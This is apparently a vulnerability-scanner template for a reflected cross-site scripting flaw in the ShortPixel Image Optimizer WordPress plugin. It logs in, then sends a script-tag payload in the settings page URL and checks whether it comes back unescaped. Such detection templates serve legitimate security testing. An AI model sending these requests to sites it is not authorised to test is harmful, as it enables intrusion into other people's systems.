id: shortpixel-image-optimizer-xss
info:
  author: Akincibor
  description: The plugin does not escape a generated URLs before outputting them
    back in an attribute, leading to Reflected Cross-Site Scripting.
  metadata:
    verified: true
  name: ShortPixel Image Optimizer < 4.22.10 - Reflected Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/8a0ddd14-7260-4fb6-bb87-2916aa41ff01
  - https://wordpress.org/plugins/shortpixel-image-optimiser
  severity: medium
  tags: xss,wp-plugin,wp,wordpress,shortpixel,authenticated
requests:
- cookie-reuse: true
  matchers:
  - part: body
    type: word
    words:
    - '&\"><script>alert(1)</script>&noheader=true&sp-action'
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Origin: {{RootURL}}

    Content-Type: application/x-www-form-urlencoded

    Cookie: wordpress_test_cookie=WP%20Cookie%20check


    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

    '
  - 'GET /wp-admin/options-general.php?page=wp-shortpixel-settings&"><script>alert(1)</script>
    HTTP/1.1

    Host: {{Hostname}}

    '
